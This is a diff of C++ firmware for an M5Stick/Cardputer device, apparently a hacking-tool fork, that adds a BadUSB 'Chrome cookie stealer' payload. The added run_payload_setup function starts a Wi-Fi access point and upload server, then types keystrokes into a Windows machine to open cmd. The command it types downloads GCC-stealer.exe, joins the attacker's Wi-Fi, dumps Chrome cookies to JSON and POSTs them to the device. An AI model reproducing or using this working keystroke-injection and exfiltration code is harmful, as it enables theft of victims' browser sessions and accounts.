@@ -60,96 +60,19 @@ void demo_windows(){ // 5
     DISP.printf(TXT_SEL_BACK);
 }
 
-static MENUL bumenu[] = { // edit this to add payloads!
-  { TXT_BACK, 0},
-  #if defined(CARDPUTER)
-  { "win-chrm_C_stealer", 1},
-  #endif
-  { "demo_android", 2},
-  { "demo_ios", 3},
-  { "demo_macos", 4},
-  { "demo_windows", 5},
-};
-
-int bumenu_size = sizeof(bumenu) / sizeof (MENUL);
-
-void payloads_menu(int option){ // edit this to add payloads!
-    switch(option) {
-      case 2:
-        demo_android();
-        break;
-      case 3:
-        demo_ios();
-        break;
-      case 4:
-        demo_macos();
-        break;
-      case 5:
-        demo_windows();
-        break;
-    }
+bool createDir(fs::FS &fs, const char * path){
+  Serial.printf("Creating Dir: %s\n", path);
+  if(fs.mkdir(path)){
+    Serial.println("Dir created/exists");
+    return true;
+  } else {
+    Serial.println("mkdir failed");
+    return false;
+  }
 }
 
-int uptimeL(){
-  return(int(millis() / 1000));
-}
-
-void screenBrightnessL(int bright){
-  Serial.printf("Brightness: %d\n", bright);
-  #if defined(AXP)
-    M5.Axp.ScreenBreath(bright);
-  #endif
-  #if defined(BACKLIGHT)
-    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
-    analogWrite(BACKLIGHT, bl);
-  #endif
-}
-
-void dimtimerL(){
-  if(screen_dim_dimmedL){
-    screenBrightnessL(brightness);
-    screen_dim_dimmedL = false;
-  }
-  screen_dim_currentL = uptimeL() + screen_dim_timeL + 2;
-}
-
-bool check_next_pressL(){
-#if defined(KB)
-  M5Cardputer.update();
-  if (M5Cardputer.Keyboard.isKeyPressed(';')){
-    // hack to handle the up arrow
-    cursor = cursor - 2;
-    dimtimerL();
-    return true;
-  }
-  //M5Cardputer.update();
-  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
-    dimtimerL();
-    return true;
-  }
-#else
-  if (digitalRead(M5_BUTTON_RST) == LOW){
-    dimtimerL();
-    return true;
-  }
-#endif
-  return false;
-}
-
-bool check_select_pressL(){
-#if defined(KB)
-  M5Cardputer.update();
-  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
-    dimtimerL();
-    return true;
-  }
-#else
-  if (digitalRead(M5_BUTTON_HOME) == LOW){
-    dimtimerL();
-    return true;
-  }
-#endif
-  return false;
+String ip2String(const IPAddress& address){
+  return String() + address[0] + "." + address[1] + "." + address[2] + "." + address[3];
 }
 
 String printDirectory_listing(File dir, int numTabs) {
@@ -218,23 +141,12 @@ void handleUpload(AsyncWebServerRequest *request, String filename, size_t index,
   }
 }
 
-void runPayloadServer(){
+IPAddress runPayloadServer(){
   WiFi.mode(WIFI_AP);
   WiFi.softAP(ssid, password);
   IPAddress IP = WiFi.softAPIP();
   DISP.println("AP: "+ssid);
   DISP.println("PSW: "+password);
-  //DISP.println(IP);
-  // Connect to Wi-Fi
-  /*WiFi.begin(ssid, password, WIFI_CHANNEL);
-  while (WiFi.status() != WL_CONNECTED)
-  {
-    delay(1000);
-    Serial.println("Connecting to WiFi...");
-  }
-  Serial.println("Connected to WiFi");
-  Serial.print("HTTP server started at http://");
-  Serial.println(WiFi.localIP());*/
   server.serveStatic("/", SD, full_files_dir.c_str());
   // Serve the HTML file as the default route
   server.on("/", [](AsyncWebServerRequest *request){
@@ -253,6 +165,104 @@ void runPayloadServer(){
   DISP.println("HTTP server started");
   DISP.print("@ http://");
   DISP.print(IP);
+  return IP;
+}
+
+void run_payload_setup(){
+  Keyboard.begin();
+  USB.begin();
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  IPAddress IP = runPayloadServer();
+  String str = ip2String(IP);
+  String cmd = "cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\"" \
+  " && curl -L https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe -o GCC-stealer.exe" \
+  " && curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/Wi-Fi-AP-0.xml -o Wi-Fi-AP-0.xml" \
+  " && netsh wlan delete profile "+ssid+"" \
+  " && netsh wlan add profile filename=\".\\Wi-Fi-AP-0.xml\"" \
+  " && netsh wlan connect name="+ssid+"" \
+  " && .\\GCC-stealer.exe --json-file" \
+  " && timeout /t 5" \
+  " && curl -X POST -F data=@cookies.json http://"+str+"/upload" \
+  " && netsh wlan disconnect & exit";
+
+  DISP.setTextColor(BGCOLOR, FGCOLOR);
+  DISP.println("Runing payload...");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  delay(2000);   
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("cmd");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print(cmd);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.printf(TXT_SEL_BACK);
+}
+
+void rootPayload0(){
+    if(!setupSdCard()){
+        rstOverride = true;
+        isSwitching = false;
+        DISP.fillScreen(BGCOLOR);
+        DISP.setCursor(0, 0);
+        DISP.setTextColor(FGCOLOR, BGCOLOR);
+        DISP.setTextSize(SMALL_TEXT);
+        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
+        DISP.printf(TXT_SEL_BACK);
+    } else {
+      if(createDir(SD, PYLD_DIR)){
+        run_payload_setup();
+      } else {
+        rstOverride = true;
+        isSwitching = false;
+        DISP.fillScreen(BGCOLOR);
+        DISP.setCursor(0, 0);
+        DISP.setTextColor(FGCOLOR, BGCOLOR);
+        DISP.setTextSize(SMALL_TEXT);
+        DISP.println("Failed to create payloads DIR, is the SDCARD inserted? Can't continue with the execution...");
+        DISP.printf(TXT_SEL_BACK);
+      }
+    }
+}
+
+static MENUL bumenu[] = { // edit this to add payloads!
+  { TXT_BACK, 0},
+  { "win-chrm_C_stealer", 1},
+  { "demo_android", 2},
+  { "demo_ios", 3},
+  { "demo_macos", 4},
+  { "demo_windows", 5},
+};
+
+int bumenu_size = sizeof(bumenu) / sizeof (MENUL);
+
+void payloads_menu(int option){ // edit this to add payloads!
+    switch(option) {
+      case 0:
+        current_proc = 1;
+        break;
+      case 1:
+        rootPayload0();
+        break;
+      case 2:
+        demo_android();
+        break;
+      case 3:
+        demo_ios();
+        break;
+      case 4:
+        demo_macos();
+        break;
+      case 5:
+        demo_windows();
+        break;
+    }
 }
 
 void drawmenuL() {
@@ -281,6 +291,147 @@ void drawmenuL() {
       DISP.setTextColor(FGCOLOR, BGCOLOR);
     }
   }
+}
+
+// Ignore...
+
+// 24 - Bad USB
+// 25 - Bad USB Wifi Scan
+// 26 - Bad USB Wifi scan results
+// 27 - Run Payload 0
+
+#if false
+
+int uptimeL(){
+  return(int(millis() / 1000));
+}
+
+void screenBrightnessL(int bright){
+  Serial.printf("Brightness: %d\n", bright);
+  #if defined(AXP)
+    M5.Axp.ScreenBreath(bright);
+  #endif
+  #if defined(BACKLIGHT)
+    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
+    analogWrite(BACKLIGHT, bl);
+  #endif
+}
+
+void dimtimerL(){
+  if(screen_dim_dimmedL){
+    screenBrightnessL(brightness);
+    screen_dim_dimmedL = false;
+  }
+  screen_dim_currentL = uptimeL() + screen_dim_timeL + 2;
+}
+
+bool check_next_pressL(){
+#if defined(KB)
+  M5Cardputer.update();
+  if (M5Cardputer.Keyboard.isKeyPressed(';')){
+    // hack to handle the up arrow
+    cursor = cursor - 2;
+    dimtimerL();
+    return true;
+  }
+  //M5Cardputer.update();
+  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
+    dimtimerL();
+    return true;
+  }
+#else
+  if (digitalRead(M5_BUTTON_RST) == LOW){
+    dimtimerL();
+    return true;
+  }
+#endif
+  return false;
+}
+
+bool check_select_pressL(){
+#if defined(KB)
+  M5Cardputer.update();
+  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
+    dimtimerL();
+    return true;
+  }
+#else
+  if (digitalRead(M5_BUTTON_HOME) == LOW){
+    dimtimerL();
+    return true;
+  }
+#endif
+  return false;
+}
+
+void run_payload_loop(){
+  if (check_next_pressL()) {
+    rstOverride = true;
+    isSwitching = true;
+    current_proc = 24;
+  }
+}
+
+void busb_setup(){
+  rstOverride = false;  
+  cursor = 0;
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(BIG_TEXT);
+  DISP.setCursor(0, 0);
+  DISP.println(PYLD_DWNLD);
+  delay(2000);
+}
+
+void busb_loop(){
+    DISP.fillScreen(BGCOLOR);
+    DISP.setTextSize(MEDIUM_TEXT);
+    DISP.setCursor(0, 0);
+    DISP.println(TXT_WF_SCNING);
+    wifict = WiFi.scanNetworks();
+    DISP.fillScreen(BGCOLOR);
+    DISP.setTextSize(SMALL_TEXT);
+    DISP.setCursor(0, 0);
+    if(wifict > 0){
+      isSwitching = true;
+      current_proc=26;
+    }
+}
+
+void busb_drawmenu() {
+  char ssid[19];
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  // scrolling menu
+  if (cursor > 4) {
+    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
+      if(cursor == i){
+        DISP.setTextColor(BGCOLOR, FGCOLOR);
+      }
+      DISP.print(" ");
+      DISP.println(WiFi.SSID(i).substring(0,19));
+      DISP.setTextColor(FGCOLOR, BGCOLOR);
+    }
+  } else {
+    for ( int i = 0 ; i < wifict ; i++ ) {
+      if(cursor == i){
+        DISP.setTextColor(BGCOLOR, FGCOLOR);
+      }
+      DISP.print(" ");
+      DISP.println(WiFi.SSID(i).substring(0,19));
+      DISP.setTextColor(FGCOLOR, BGCOLOR);
+    }
+  }
+  if(cursor == wifict){
+    DISP.setTextColor(BGCOLOR, FGCOLOR);
+  }
+  DISP.println(TXT_WF_RESCAN);
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  if(cursor == wifict + 1){
+    DISP.setTextColor(BGCOLOR, FGCOLOR);
+  }
+  DISP.println(String(TXT_BACK));
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
 }
 
 bool getPayload(String ssid, String password) {
@@ -353,101 +504,6 @@ bool getPayload(String ssid, String password) {
   }
   WiFi.disconnect();
   return downloadOK;
-}
-
-bool createDir(fs::FS &fs, const char * path){
-  Serial.printf("Creating Dir: %s\n", path);
-  if(fs.mkdir(path)){
-    Serial.println("Dir created/exists");
-    return true;
-  } else {
-    Serial.println("mkdir failed");
-    return false;
-  }
-}
-
-char* concat(const char *s1, const char *s2)
-{
-    char *result = (char*)malloc(strlen(s1) + strlen(s2) + 1); // +1 for the null-terminator
-    strcpy(result, s1);
-    strcat(result, s2);
-    return result;
-}
-
-void rootPayload0(){
-    if(!setupSdCard()){
-        rstOverride = true;
-        isSwitching = false;
-        DISP.fillScreen(BGCOLOR);
-        DISP.setCursor(0, 0);
-        DISP.setTextColor(FGCOLOR, BGCOLOR);
-        DISP.setTextSize(SMALL_TEXT);
-        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
-        DISP.printf(TXT_SEL_BACK);
-    } else {
-      if(createDir(SD, PYLD_DIR)){
-        bool exists = SD.exists(PYLD_PATH);
-        int sz = 0;
-        if(exists){
-          File fp = SD.open(PYLD_PATH);
-          sz = fp.size();
-          fp.close();
-        }
-        if(exists && sz == PYLD_EXP_SIZE){
-          // run payload
-          //current_proc = 25;
-          current_proc = 27;
-        } else {
-          current_proc = 25;
-        }
-      } else {
-        rstOverride = true;
-        isSwitching = false;
-        DISP.fillScreen(BGCOLOR);
-        DISP.setCursor(0, 0);
-        DISP.setTextColor(FGCOLOR, BGCOLOR);
-        DISP.setTextSize(SMALL_TEXT);
-        DISP.println("Failed to create payloads DIR, is the SDCARD inserted? Can't continue with the execution...");
-        DISP.printf(TXT_SEL_BACK);
-      }
-    }
-}
-
-void busb_drawmenu() {
-  char ssid[19];
-  DISP.setTextSize(SMALL_TEXT);
-  DISP.fillScreen(BGCOLOR);
-  DISP.setCursor(0, 0);
-  // scrolling menu
-  if (cursor > 4) {
-    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
-      if(cursor == i){
-        DISP.setTextColor(BGCOLOR, FGCOLOR);
-      }
-      DISP.print(" ");
-      DISP.println(WiFi.SSID(i).substring(0,19));
-      DISP.setTextColor(FGCOLOR, BGCOLOR);
-    }
-  } else {
-    for ( int i = 0 ; i < wifict ; i++ ) {
-      if(cursor == i){
-        DISP.setTextColor(BGCOLOR, FGCOLOR);
-      }
-      DISP.print(" ");
-      DISP.println(WiFi.SSID(i).substring(0,19));
-      DISP.setTextColor(FGCOLOR, BGCOLOR);
-    }
-  }
-  if(cursor == wifict){
-    DISP.setTextColor(BGCOLOR, FGCOLOR);
-  }
-  DISP.println(TXT_WF_RESCAN);
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
-  if(cursor == wifict + 1){
-    DISP.setTextColor(BGCOLOR, FGCOLOR);
-  }
-  DISP.println(String(TXT_BACK));
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
 }
 
 void busb_result_setup() {
@@ -575,61 +631,44 @@ void busb_result_loop(){
   }
 }
 
-void run_payload_setup(){
-  Keyboard.begin();
-  USB.begin();
-  DISP.fillScreen(BGCOLOR);
-  DISP.setCursor(0, 0);
-  runPayloadServer();
-  DISP.setTextColor(BGCOLOR, FGCOLOR);
-  DISP.println("Runing payload...");
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
-  delay(2000);   
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  Keyboard.releaseAll();
-  delay(1000);
-  Keyboard.print("cmd");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(1000);
-  Keyboard.print("echo 'Keystrokes injection...'");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
-  DISP.printf(TXT_SEL_BACK);
-}
-
-void run_payload_loop(){
-  if (check_next_pressL()) {
-    rstOverride = false;
-    isSwitching = true;
-    current_proc = 24;
-  }
-}
-
-void busb_setup(){
-  rstOverride = false;  
-  cursor = 0;
-  DISP.fillScreen(BGCOLOR);
-  DISP.setTextSize(BIG_TEXT);
-  DISP.setCursor(0, 0);
-  DISP.println(PYLD_DWNLD);
-  delay(2000);
-}
-
-void busb_loop(){
-    DISP.fillScreen(BGCOLOR);
-    DISP.setTextSize(MEDIUM_TEXT);
-    DISP.setCursor(0, 0);
-    DISP.println(TXT_WF_SCNING);
-    wifict = WiFi.scanNetworks();
-    DISP.fillScreen(BGCOLOR);
-    DISP.setTextSize(SMALL_TEXT);
-    DISP.setCursor(0, 0);
-    if(wifict > 0){
-      isSwitching = true;
-      current_proc=26;
+void rootPayload0Old(){
+    if(!setupSdCard()){
+        rstOverride = true;
+        isSwitching = false;
+        DISP.fillScreen(BGCOLOR);
+        DISP.setCursor(0, 0);
+        DISP.setTextColor(FGCOLOR, BGCOLOR);
+        DISP.setTextSize(SMALL_TEXT);
+        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
+        DISP.printf(TXT_SEL_BACK);
+    } else {
+      if(createDir(SD, PYLD_DIR)){
+        bool exists = SD.exists(PYLD_PATH);
+        int sz = 0;
+        if(exists){
+          File fp = SD.open(PYLD_PATH);
+          sz = fp.size();
+          fp.close();
+        }
+        if(exists && sz == PYLD_EXP_SIZE){
+          // run payload
+          //current_proc = 25;
+          current_proc = 27;
+        } else {
+          current_proc = 25;
+        }
+        run_payload_setup();
+      } else {
+        rstOverride = true;
+        isSwitching = false;
+        DISP.fillScreen(BGCOLOR);
+        DISP.setCursor(0, 0);
+        DISP.setTextColor(FGCOLOR, BGCOLOR);
+        DISP.setTextSize(SMALL_TEXT);
+        DISP.println("Failed to create payloads DIR, is the SDCARD inserted? Can't continue with the execution...");
+        DISP.printf(TXT_SEL_BACK);
+      }
     }
 }
+
+#endif
